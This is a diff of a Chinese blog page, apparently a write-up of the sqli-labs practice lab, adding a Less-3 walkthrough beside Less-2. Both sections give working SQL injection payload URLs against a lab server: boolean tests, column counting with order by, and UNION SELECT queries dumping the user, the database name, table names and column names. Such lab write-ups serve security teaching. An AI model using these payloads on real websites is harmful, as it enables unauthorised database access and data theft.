@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/12/15/SQL注入之Error Based/" itemprop="url">sql报错注入(原理&题目)</a></h1>
+                <a class="post-title-link" href="/2018/12/15/SQL注入之Error Based/" itemprop="url">sqli-labs之Error Based(原理&题目)</a></h1>
         
 
         <div class="post-meta">
@@ -352,6 +352,16 @@
 <p>于是尝试<strong>payload</strong>：<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> and 1=1 正常页面有返回<br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> and 1=2 无返回<br>因此判断存在sql注入。</p>
 <p><strong>试探字段数</strong><br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> order by 3<br>order by 4报错 因此字段数为3</p>
 <p><strong>获取信息</strong><br><a href="http://43.247.91.228:84/Less-2/?id=-1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=-1</a> union select 1,2,3<br><strong>查询数据库名</strong><br><a href="http://43.247.91.228:84/Less-2/?id=1" target="_blank" rel="noopener">http://43.247.91.228:84/Less-2/?id=1</a> union select 1,2,database()<br>之后照着union注入思路即可。</p>
+<h2 id="Less-3-Error-Based-String-with-Twist"><a href="#Less-3-Error-Based-String-with-Twist" class="headerlink" title="Less-3 Error Based-String(with Twist)"></a>Less-3 Error Based-String(with Twist)</h2><p>题目信息：<br>Please input the ID as parameter with numeric value </p>
+<p>根据题目知道是字符注入。<br>于是：<br><a href="http://43.247.91.228:84/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=1&#39;</a> and ‘1’=’1 返回正常<br><a href="http://43.247.91.228:84/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=1&#39;</a> and ‘1’=’2 返回异常<br>因此判定存在字符注入。</p>
+<p>在尝试payload的过程中，返回错误提示：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘order by 3’) LIMIT 0,1’ at line 1 </p>
+<p><strong>注意near后面：’order by 3’)</strong><br>这里它意味着，开发者使用的查询是：<br>Select login_name, select password from table where id= <strong>(‘our input here’)</strong></p>
+<p>于是构造闭合payload：<br><a href="http://43.247.91.228:84/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=1&#39;</a>) order by 3 –+<br>此时页面返回正常。order by 4报错。所以字段数为3.</p>
+<p><strong>获取数据库信息</strong><br><strong>payload:</strong><br><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,3 –+</p>
+<p><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,user() –+</p>
+<p><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,database() –+</p>
+<p><strong>爆出所有表名</strong><br><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database() –+</p>
+<p><strong>爆出字段名</strong><br><a href="http://43.247.91.228:84/Less-3/?id=-1&#39;" target="_blank" rel="noopener">http://43.247.91.228:84/Less-3/?id=-1&#39;</a>) union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=database() and TABLE_NAME=’emails’ –+</p>
 
           
         
